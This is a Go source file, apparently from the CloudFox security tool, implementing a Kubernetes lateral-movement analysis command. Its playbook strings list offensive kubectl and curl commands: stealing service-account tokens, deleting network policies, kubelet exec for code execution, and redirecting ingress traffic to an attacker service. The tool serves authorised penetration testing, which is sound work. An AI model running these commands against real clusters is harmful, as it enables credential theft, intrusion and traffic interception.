package commands

import (
	"fmt"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	attackpathservice "github.com/BishopFox/cloudfox/kubernetes/services/attackpathService"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
)

var LateralMovementCmd = &cobra.Command{
	Use:     "lateral-movement",
	Aliases: []string{"lm", "lateral"},
	Short:   "Identify lateral movement paths in Kubernetes",
	Long: `Analyze Kubernetes RBAC and resources to identify lateral movement opportunities.

This module examines permissions that allow movement between pods, namespaces,
and nodes within the cluster.

Detected lateral movement vectors include:

Pod Access:
- Pod exec (execute commands in containers)
- Pod attach (attach to running containers)
- Pod port-forward (tunnel to pod ports)

Token/Credential Theft:
- Secret access (SA tokens, TLS certs, credentials)
- ServiceAccount token generation
- ConfigMap access (often contains service credentials)

Service Discovery:
- Service enumeration
- Endpoint discovery (direct pod IP access)
- Namespace enumeration

Network Access:
- Network policy modification/deletion
- Ingress modification (traffic redirection)

Node Access:
- Kubelet API proxy access
- Node proxy access

Usage:
  cloudfox kubernetes lateral-movement`,
	Run: runLateralMovementCommand,
}

type LateralMovementOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o LateralMovementOutput) TableFiles() []internal.TableFile { return o.Table }
func (o LateralMovementOutput) LootFiles() []internal.LootFile   { return o.Loot }

type LateralMovementModule struct {
	// All paths from combined analysis
	AllPaths       []attackpathservice.AttackPath
	ClusterPaths   []attackpathservice.AttackPath
	NamespacePaths map[string][]attackpathservice.AttackPath
	Namespaces     []string
}

func runLateralMovementCommand(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	// Validate authentication first
	if err := sdk.ValidateAuth(ctx); err != nil {
		logger.ErrorM(fmt.Sprintf("Authentication failed:\n%v", err), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("Analyzing lateral movement paths for %s", globals.ClusterName), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)

	// Initialize attack path service
	svc, err := attackpathservice.New()
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to initialize attack path service: %v", err), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)
		return
	}
	svc.SetModuleName(globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)

	// Run analysis
	result, err := svc.CombinedAnalysis(ctx, "lateral")
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to analyze lateral movement: %v", err), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)
		return
	}

	module := &LateralMovementModule{
		AllPaths:       result.AllPaths,
		ClusterPaths:   result.ClusterPaths,
		NamespacePaths: result.NamespacePaths,
		Namespaces:     result.Namespaces,
	}

	if len(module.AllPaths) == 0 {
		logger.InfoM("No lateral movement paths found", globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)
		return
	}

	// Count by scope and risk
	clusterCount := len(module.ClusterPaths)
	namespaceCount := len(module.AllPaths) - clusterCount
	riskCounts := countLateralRiskLevels(module.AllPaths)

	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s): %d cluster-level, %d namespace-level",
		len(module.AllPaths), clusterCount, namespaceCount), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
		riskCounts.Critical, riskCounts.High, riskCounts.Medium, riskCounts.Low), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)

	// Generate output
	tables := module.buildLateralTables()
	loot := module.generateLateralLoot()

	output := LateralMovementOutput{
		Table: tables,
		Loot:  loot,
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Lateral-Movement",
		globals.ClusterName,
		"results",
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_LATERAL_MOVEMENT_MODULE_NAME), globals.K8S_LATERAL_MOVEMENT_MODULE_NAME)
}

func (m *LateralMovementModule) buildLateralTables() []internal.TableFile {
	headers := []string{
		"Principal",
		"Principal Type",
		"Source",
		"Scope",
		"Role",
		"Role Binding",
		"Method",
		"Target Resource",
		"Permissions",
		"Description",
	}

	var body [][]string

	for _, path := range m.AllPaths {
		scope := path.ScopeName
		if path.ScopeType == "cluster" {
			scope = "cluster-wide"
		}
		source := path.SourceType
		if source == "" {
			source = "core"
		}

		body = append(body, []string{
			path.Principal,
			path.PrincipalType,
			source,
			scope,
			path.RoleName,
			path.BindingName,
			path.Method,
			path.TargetResource,
			strings.Join(path.Permissions, ", "),
			path.Description,
		})
	}

	return []internal.TableFile{
		{
			Name:   "LateralMovement",
			Header: headers,
			Body:   body,
		},
	}
}

func (m *LateralMovementModule) generateLateralLoot() []internal.LootFile {
	var lootContent []string

	lootContent = append(lootContent, "# ===========================================")
	lootContent = append(lootContent, "# Lateral Movement Commands")
	lootContent = append(lootContent, "# ===========================================")

	// Section: Pod Access
	podAccessPaths := filterByCategory(m.AllPaths, "Pod Access")
	if len(podAccessPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# -------------------------------------------")
		lootContent = append(lootContent, "# POD ACCESS - Execute/attach to containers")
		lootContent = append(lootContent, "# -------------------------------------------")
		for _, path := range podAccessPaths {
			lootContent = append(lootContent, "")
			lootContent = append(lootContent, fmt.Sprintf("# %s (%s) - %s via %s", path.Principal, path.PrincipalType, path.ScopeName, path.RoleName))
			lootContent = append(lootContent, path.ExploitCommand)
		}
	}

	// Section: Token/Credential Theft
	tokenPaths := filterByCategory(m.AllPaths, "Token Theft")
	if len(tokenPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# -------------------------------------------")
		lootContent = append(lootContent, "# TOKEN THEFT - Steal SA tokens and credentials")
		lootContent = append(lootContent, "# -------------------------------------------")
		for _, path := range tokenPaths {
			lootContent = append(lootContent, "")
			lootContent = append(lootContent, fmt.Sprintf("# %s (%s) - %s via %s", path.Principal, path.PrincipalType, path.ScopeName, path.RoleName))
			lootContent = append(lootContent, path.ExploitCommand)
		}
	}

	// Section: Service Discovery
	discoveryPaths := filterByMultipleCategories(m.AllPaths, []string{"Service Discovery", "Namespace Discovery", "Pod Discovery"})
	if len(discoveryPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# -------------------------------------------")
		lootContent = append(lootContent, "# SERVICE DISCOVERY - Find lateral movement targets")
		lootContent = append(lootContent, "# -------------------------------------------")
		for _, path := range discoveryPaths {
			lootContent = append(lootContent, "")
			lootContent = append(lootContent, fmt.Sprintf("# %s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
		}
	}

	// Section: Network Access
	networkPaths := filterByCategory(m.AllPaths, "Network")
	if len(networkPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# -------------------------------------------")
		lootContent = append(lootContent, "# NETWORK - Bypass network policies")
		lootContent = append(lootContent, "# -------------------------------------------")
		for _, path := range networkPaths {
			lootContent = append(lootContent, "")
			lootContent = append(lootContent, fmt.Sprintf("# %s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, fmt.Sprintf("# %s", path.Description))
			lootContent = append(lootContent, path.ExploitCommand)
		}
	}

	// Section: Node Access
	nodePaths := filterByCategory(m.AllPaths, "Node Access")
	if len(nodePaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# -------------------------------------------")
		lootContent = append(lootContent, "# NODE ACCESS - Access kubelet and node resources")
		lootContent = append(lootContent, "# -------------------------------------------")
		for _, path := range nodePaths {
			lootContent = append(lootContent, "")
			lootContent = append(lootContent, fmt.Sprintf("# %s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
		}
	}

	// Build playbook content using centralized attackpathService function
	clusterHeader := fmt.Sprintf("Cluster: %s", globals.ClusterName)
	playbookContent := attackpathservice.GenerateLateralPlaybook(m.AllPaths, clusterHeader)

	// Fallback to legacy playbook if centralized returns empty
	if playbookContent == "" {
		methodGroups := groupLateralByMethod(m.AllPaths)
		playbookContent = m.generateLateralPlaybook(methodGroups)
	}

	return []internal.LootFile{
		{
			Name:     "LateralMovement-Commands",
			Contents: strings.Join(lootContent, "\n"),
		},
		{
			Name:     "LateralMovement-Playbook",
			Contents: playbookContent,
		},
	}
}

// generateLateralPlaybook creates a reference-style guide for lateral movement organized by technique
func (m *LateralMovementModule) generateLateralPlaybook(methodGroups map[string][]attackpathservice.AttackPath) string {
	var content []string

	content = append(content, "#####################################")
	content = append(content, "##### Lateral Movement Playbook")
	content = append(content, "##### Reference Guide by Technique")
	content = append(content, "#####################################")
	content = append(content, "")

	// Pod Access (Exec/Attach/Port-Forward)
	content = append(content, `
##############################################
## POD ACCESS
##############################################
# Execute commands, attach to containers, port-forward to services`)
	if entities := getLateralEntitiesForMethods(methodGroups, "Pod Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with pod access permissions")
	}
	content = append(content, `
# Find all pods and their service accounts:
kubectl get pods -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SA:.spec.serviceAccountName,NODE:.spec.nodeName,IP:.status.podIP'

# Exec into a pod:
kubectl exec -it POD_NAME -n NAMESPACE -- /bin/sh

# Exec with specific container (for multi-container pods):
kubectl exec -it POD_NAME -n NAMESPACE -c CONTAINER_NAME -- /bin/sh

# Attach to a running container:
kubectl attach -it POD_NAME -n NAMESPACE

# Port-forward to access internal services:
kubectl port-forward POD_NAME 8080:80 -n NAMESPACE
kubectl port-forward svc/SERVICE_NAME 8080:80 -n NAMESPACE

# From inside a compromised pod, pivot to other pods:
# 1. Find other pods: curl -s $KUBERNETES_SERVICE_HOST/api/v1/pods -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -k
# 2. Access via service DNS: curl http://SERVICE_NAME.NAMESPACE.svc.cluster.local`)

	// Token Theft
	content = append(content, `

##############################################
## TOKEN/CREDENTIAL THEFT
##############################################
# Steal SA tokens from secrets for lateral movement`)
	if entities := getLateralEntitiesForMethods(methodGroups, "Token Theft"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with token theft permissions")
	}
	content = append(content, `
# List SA token secrets:
kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name) -> SA: \(.metadata.annotations["kubernetes.io/service-account.name"])"'

# Extract token from secret:
kubectl get secret SA_TOKEN_SECRET -n NAMESPACE -o jsonpath='{.data.token}' | base64 -d

# Find high-privilege service accounts:
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]? | select(.kind=="ServiceAccount") | "\(.namespace)/\(.name)"'

# Use stolen token:
TOKEN="eyJhbG..."
kubectl --token="$TOKEN" auth can-i --list
kubectl --token="$TOKEN" get secrets -A

# From inside a pod, use another pod's token:
# If you can read secrets, get token and use it to pivot`)

	// Service/Endpoint Discovery
	content = append(content, `

##############################################
## SERVICE DISCOVERY
##############################################
# Discover services, endpoints, and pods for targeting`)
	if entities := getLateralEntitiesForMethods(methodGroups, "Service Discovery", "Namespace Discovery", "Pod Discovery"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with discovery permissions")
	}
	content = append(content, `
# List all namespaces:
kubectl get namespaces

# List all services:
kubectl get services -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,PORTS:.spec.ports[*].port'

# Get endpoints (direct pod IPs):
kubectl get endpoints -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,ENDPOINTS:.subsets[*].addresses[*].ip'

# Find databases and sensitive services:
kubectl get services -A | grep -iE '(mysql|postgres|redis|mongo|elastic|kafka|rabbitmq|vault)'

# DNS enumeration from inside cluster:
# nslookup kubernetes.default.svc.cluster.local
# nslookup SERVICE_NAME.NAMESPACE.svc.cluster.local

# Direct pod-to-pod access (bypass services):
# curl http://POD_IP:PORT`)

	// Config Access
	content = append(content, `

##############################################
## CONFIG ACCESS
##############################################
# Read configmaps for service URLs and credentials`)
	if entities := getLateralEntitiesForMethods(methodGroups, "Config Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with config access permissions")
	}
	content = append(content, `
# Find configmaps with connection strings:
kubectl get configmaps -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | keys)"'

# Search for service URLs in configmaps:
kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value)"' | grep -iE '(http|https|jdbc|redis|mongo|amqp)://'

# Extract specific configmap:
kubectl get configmap CONFIG_NAME -n NAMESPACE -o yaml`)

	// Network Policy Bypass
	content = append(content, `

##############################################
## NETWORK POLICY BYPASS
##############################################
# Delete or modify network policies to enable lateral movement`)
	if entities := getLateralEntitiesForMethods(methodGroups, "Network", "CRD Policy Bypass"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with network policy permissions")
	}
	content = append(content, `
# List network policies:
kubectl get networkpolicies -A

# View network policy details:
kubectl get networkpolicy POLICY_NAME -n NAMESPACE -o yaml

# Delete network policy to remove restrictions:
kubectl delete networkpolicy POLICY_NAME -n NAMESPACE

# Modify network policy to allow all ingress:
kubectl patch networkpolicy POLICY_NAME -n NAMESPACE --type=json -p='[{"op":"replace","path":"/spec/ingress","value":[{}]}]'

# Modify to allow all egress:
kubectl patch networkpolicy POLICY_NAME -n NAMESPACE --type=json -p='[{"op":"replace","path":"/spec/egress","value":[{}]}]'

# Cilium/Calico/Istio network policies:
kubectl get ciliumnetworkpolicies -A 2>/dev/null
kubectl get networkpolicies.crd.projectcalico.org -A 2>/dev/null
kubectl get authorizationpolicies.security.istio.io -A 2>/dev/null`)

	// Node Access
	content = append(content, `

##############################################
## NODE ACCESS
##############################################
# Access kubelet API for node-level lateral movement`)
	if entities := getLateralEntitiesForMethods(methodGroups, "Node Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with node access permissions")
	}
	content = append(content, `
# List nodes:
kubectl get nodes -o wide

# Proxy to kubelet API (list pods):
kubectl get --raw "/api/v1/nodes/NODE_NAME/proxy/pods"

# Access kubelet metrics:
kubectl get --raw "/api/v1/nodes/NODE_NAME/proxy/metrics"

# Direct kubelet access (if you have network access to node):
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://NODE_IP:10250/pods

# Kubelet exec (RCE on any pod on the node):
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER" \
  -d "cmd=id"`)

	// Ingress Manipulation
	content = append(content, `

##############################################
## INGRESS MANIPULATION
##############################################
# Modify ingress to redirect traffic for MITM`)
	if entities := getLateralEntitiesForMethods(methodGroups, "Ingress"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with ingress permissions")
	}
	content = append(content, `
# List ingresses:
kubectl get ingress -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,HOSTS:.spec.rules[*].host,PATHS:.spec.rules[*].http.paths[*].path'

# Modify ingress to redirect to attacker service:
kubectl patch ingress INGRESS_NAME -n NAMESPACE --type=json \
  -p='[{"op":"replace","path":"/spec/rules/0/http/paths/0/backend/service/name","value":"attacker-svc"}]'

# Add new path that routes to attacker:
kubectl patch ingress INGRESS_NAME -n NAMESPACE --type=json \
  -p='[{"op":"add","path":"/spec/rules/0/http/paths/-","value":{"path":"/evil","pathType":"Prefix","backend":{"service":{"name":"attacker-svc","port":{"number":80}}}}}]'`)

	return strings.Join(content, "\n")
}

// groupLateralByMethod groups paths by their Method field
func groupLateralByMethod(paths []attackpathservice.AttackPath) map[string][]attackpathservice.AttackPath {
	groups := make(map[string][]attackpathservice.AttackPath)
	for _, path := range paths {
		groups[path.Method] = append(groups[path.Method], path)
	}
	return groups
}

// getLateralEntitiesForMethods returns unique entities that have any of the specified methods
func getLateralEntitiesForMethods(methodGroups map[string][]attackpathservice.AttackPath, methods ...string) []string {
	seen := make(map[string]bool)
	var entities []string

	for _, method := range methods {
		if paths, ok := methodGroups[method]; ok {
			for _, path := range paths {
				key := fmt.Sprintf("%s:%s", path.PrincipalType, path.Principal)
				if !seen[key] {
					seen[key] = true
					entities = append(entities, fmt.Sprintf("%s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
				}
			}
		}
	}

	return entities
}

// Helper functions

func countLateralRiskLevels(paths []attackpathservice.AttackPath) *shared.RiskCounts {
	counts := shared.NewRiskCounts()
	for _, path := range paths {
		counts.Add(path.RiskLevel)
	}
	return counts
}

func filterByCategory(paths []attackpathservice.AttackPath, category string) []attackpathservice.AttackPath {
	var filtered []attackpathservice.AttackPath
	for _, path := range paths {
		if path.Category == category {
			filtered = append(filtered, path)
		}
	}
	return filtered
}

func filterByMultipleCategories(paths []attackpathservice.AttackPath, categories []string) []attackpathservice.AttackPath {
	categorySet := make(map[string]bool)
	for _, c := range categories {
		categorySet[c] = true
	}

	var filtered []attackpathservice.AttackPath
	for _, path := range paths {
		if categorySet[path.Category] {
			filtered = append(filtered, path)
		}
	}
	return filtered
}
